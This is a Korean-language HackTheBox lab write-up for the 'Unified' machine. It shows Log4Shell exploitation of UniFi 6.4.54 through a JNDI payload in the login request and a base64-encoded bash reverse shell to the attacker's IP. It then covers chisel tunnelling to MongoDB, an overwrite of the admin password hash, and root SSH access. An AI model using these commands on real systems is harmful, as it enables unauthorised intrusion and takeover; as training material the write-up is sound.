# Unified - HackTheBox StartingPoint
## Recon
```bash
sudo nmap -p 22,6789,8080,8443,8843,8880 -sC -sV -vv -oA unified 10.129.10.218
```
<img width="1102" height="528" alt="image" src="https://github.com/user-attachments/assets/91a96ee8-a75c-46b0-ae33-91ce35e59a34" />
<img width="1102" height="253" alt="image" src="https://github.com/user-attachments/assets/8c31530a-cab5-4eb5-8e5e-1be802131150" />
<img width="1102" height="72" alt="image" src="https://github.com/user-attachments/assets/7e996938-49a5-4bea-8450-0afa398eac95" />

- SSH(22)
- HTTP(8080)
- HTTPS(8443)
- HTTPS(8843)
- HTTP(8880)

---

## HTTP(8080) / HTTPS(8843)
- banner grabbing
```bash
whatweb https://10.129.10.218:8443
```
<img width="1102" height="142" alt="image" src="https://github.com/user-attachments/assets/6aaef7e2-15a2-4284-9ff4-d9bb57f1d61c" />

<br>
<br>

- 8080포트로 접속시 8443으로 리다이렉션 됨.
- `unifi 6.4.54`
<img width="542" height="525" alt="image" src="https://github.com/user-attachments/assets/7dc3f80c-8065-467d-a4fc-f849b584a1b2" />

---
## Log4j
- `JAVA` 라이브러리 중 하나인 `Log4j`에서 발견된 RCE 취약점
- https://www.sprocketsecurity.com/blog/another-log4j-on-the-fire-unifi
<img width="1042" height="186" alt="image" src="https://github.com/user-attachments/assets/0030d98d-6d46-4054-9bcc-e0402715bf1f" />

<br>
<br>

```bash
git clone https://github.com/veracode-research/rogue-jndi && cd rogue-jndi && mvn package

# YmFzaCAtYyBiYXNoIC1pID4mL2Rldi90Y3AvMTAuMTAuMTQuMjQwLzQ0NDQgMD4mMQo=
echo 'bash -c bash -i >&/dev/tcp/10.10.14.240/4444 0>&1' | base64

java -jar rogue-jndi/target/RogueJndi-1.1.jar --command "bash -c {echo,YmFzaCAtYyBiYXNoIC1pID4mL2Rldi90Y3AvMTAuMTAuMTQuMjQwLzQ0NDQgMD4mMQo=}|{base64,-d}|{bash,-i}" --hostname "10.10.14.240"
```
<img width="1104" height="316" alt="image" src="https://github.com/user-attachments/assets/1e529458-83b7-4fe8-a897-a4549c5301ad" />

<br>
<br>

- `burpsuite`로 로그인 요청을 가로채서 `"${jndi:ldap://10.10.14.240:1389/o=tomcat}"`를 `remeber`에넣어서 전달
<img width="773" height="477" alt="image" src="https://github.com/user-attachments/assets/8de76773-86a3-49f0-9b75-ba3e3e5abc0e" />

<br>
<br>

- 셸 획득
<img width="1104" height="138" alt="image" src="https://github.com/user-attachments/assets/57b384bd-15ea-4af3-aa00-9244cd5d8b9d" />

---
## Privesc
- 링크에서 `unifi`가 `mongodb`를 사용하고 있다는 것을 확인할 수 있음.
- 실행되고 있는 프로세스 목록에서 확인해보니 `27117`포트에서 `mongodb`가 실행되고 있는 것을 확인.
<img width="1104" height="138" alt="image" src="https://github.com/user-attachments/assets/5722359a-a29b-45a7-baff-66ccdaa2758e" />

<br>
<br>

- `chisel`를 사용해서 터널링 생성
```bash
sudo ./chisel server --reverse -v -p 1234 --socks5
```
<img width="1104" height="138" alt="image" src="https://github.com/user-attachments/assets/ffb6d951-49b2-488a-8d91-7807e23003e0" />

<br>
<br>

```bash
./chisel client -v 10.10.14.240:1234 R:socks
```
<img width="1104" height="126" alt="image" src="https://github.com/user-attachments/assets/cf61f21f-8fa2-4c8f-b302-9ffc2ef3f431" />

<br>
<br>

- `prxoychains`와 `mongosh`를 사용하여 `mongodb` 접속 후 db 확인.
```bash
proxychains mongosh --host localhost --port 27117
```
<img width="1104" height="315" alt="image" src="https://github.com/user-attachments/assets/d037ca82-938e-4bbc-bd95-77ddb15a2a48" />
<img width="1104" height="123" alt="image" src="https://github.com/user-attachments/assets/74cfbc87-e0e2-4d41-be6c-9ad4ca4dcf30" />

<br>
<br>

- `ace` db의 `admin` collection을 조회해보니 `administrator`의 계정이 확인됨.
- 해당 해시를 크래킹을 시도해보았으나 실패.
```
show dbs;

use admin;

db.admin.find();
```
```bash
hashcat hash ~/util/rockyou.txt
```
<img width="1104" height="162" alt="image" src="https://github.com/user-attachments/assets/eeff29f3-3888-4784-88cc-ab2958969f15" />

<br>
<br>

- `sha-512`로 패스워드가 암호화가 된다는 것을 확인하여 `administrator`의 암호를 `password`로 교체를 시도.
<img width="1071" height="177" alt="image" src="https://github.com/user-attachments/assets/f071a125-b124-428d-8c80-ecfbd7356b9a" />

<br>
<br>

```bash
mkpasswd -m sha-512 password
```
<img width="1104" height="75" alt="image" src="https://github.com/user-attachments/assets/23d8d89c-129a-4105-bced-3937ce5b5aec" />

<br>
<br>

```
db.admin.updateOne({name:'administrator'},{$set:{x_shadow:'$6$MAQvinWPLqmiLt9t$axLwiLf0fW7Ln60XYQoe2wwy1AbTMMXZw6mHB0vGRdVvPAXqIn9v4kPJiuYYwkrKvLzvhmwzbr0FbO6vRKFzT/'}});
```
<img width="1104" height="163" alt="image" src="https://github.com/user-attachments/assets/72e3c79d-7c85-4e6c-a118-87237f620a80" />

<br>
<br>

- `admin:password`로 로그인 시도하여 성공.
<img width="1100" height="602" alt="image" src="https://github.com/user-attachments/assets/780b5a66-9fdc-4448-95ea-be5b7dd0378e" />

<br>
<br>

- `settings`의 아래에서 SSH 비밀번호를 확인할 수 있음.
<img width="1071" height="250" alt="image" src="https://github.com/user-attachments/assets/7e9781cb-7390-4e2b-9686-2975d9ea967b" />

<br>
<br>

- `root`로 로그인을 시도하여 성공.
```bash
ssh root@10.129.96.149
```
<img width="1071" height="525" alt="image" src="https://github.com/user-attachments/assets/56aae88c-cf6f-407a-9eb0-bb0341f6df6f" />

---
## FLAG
- `/home/michael/user.txt`
<img width="1071" height="193" alt="image" src="https://github.com/user-attachments/assets/4feb3627-eff7-4513-83df-5e50280c8b3d" />

<br>
<br>

- `/root/root.txt`
<img width="1071" height="193" alt="image" src="https://github.com/user-attachments/assets/e118449a-fdb5-419e-a0c8-ddee585ac0d4" />


